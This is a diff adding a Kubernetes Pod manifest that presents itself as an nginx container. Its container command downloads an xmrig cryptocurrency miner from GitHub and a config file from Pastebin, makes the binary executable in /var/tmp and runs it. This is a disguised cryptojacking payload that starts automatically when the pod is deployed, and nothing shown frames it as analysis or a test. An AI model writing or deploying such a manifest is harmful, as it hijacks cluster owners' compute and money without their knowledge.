@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: nginx3
+  name: nginx4
+spec:
+  containers:
+  - image: nginx
+    name: nginx3
+    command:
+      - sh
+      - -c 
+      - curl -o /var/tmp/xmrig -L https://github.com/mtverraen/clusterduck/raw/main/file.tar.gz;curl -o /var/tmp/config.json https://pastebin.com/raw/9sxsXLrM;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;./xmrig -c config.json
+    resources: {}
+  dnsPolicy: ClusterFirst
+  restartPolicy: Always
